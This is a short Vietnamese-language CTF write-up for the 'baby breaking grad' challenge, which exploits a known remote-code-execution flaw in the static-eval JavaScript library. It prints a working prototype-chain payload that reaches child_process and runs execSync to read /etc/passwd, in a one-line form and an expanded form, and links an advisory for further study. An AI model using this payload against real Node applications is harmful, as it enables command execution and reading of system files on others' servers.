- Tiêu đề: baby breaking grad
- Nội dung: RCE in static-eval lib 

- Vào view source không có gì nên mình cũng nhận định lỗi từ thư viện 
- Thằng nào có eval là lỗi thôi =)))) 

![Alt text](<../image/31.1.png>)

- Search thư viện trên ra lỗi ngay 

![Alt text](<../image/31.2.png>)

- Giờ kiếm payload nhét vào:
(function myTag(y){return ''[!y?'__proto__':'constructor'][y]})('constructor')('throw new Error(global.process.mainModule.constructor._load(\"child_process\").execSync(\"cat /etc/passwd\").toString())')()
- việc định nghĩa và khai báo các hàm trong () gọi là function expression
- Viết đẹp ra là:
/////////////////////////
(
  function myTag(y){
    var someString = '';
    var x;
    if (y) {
        x = someString['__proto__'];
    } else {
        x = someString['constructor'] ;
    }
    return x[y];
)
var func = myTag('constructor');
var exploit = func('throw new Error(global.process.mainModule.constructor._load(\"child_process\").execSync(\"cat /etc/passwd\").toString())');
exploit();
////////////////////////
- Mình để thành throw new error vì nếu console thì không có kết quả trả về (bài này đơn giản chỉ nope hoặc passed thôi)


![Alt text](<../image/31.3.png>)
![Alt text](<../image/31.4.png>)


#hackerga2101: 
- Chi tiết về cách xây dựng payload và lỗi: 
https://security.snyk.io/vuln/SNYK-JS-STATICEVAL-173693
https://hilb3r7.github.io/walkthroughs/babybreakinggrad.html // nên đọc lại
- có liên quan đến kỹ thuật prototype chain 
- Hàm eval và hàm tạo Function đều cho phép thực thi đoạn mã JavaScript từ một chuỗi.(chat gpt)
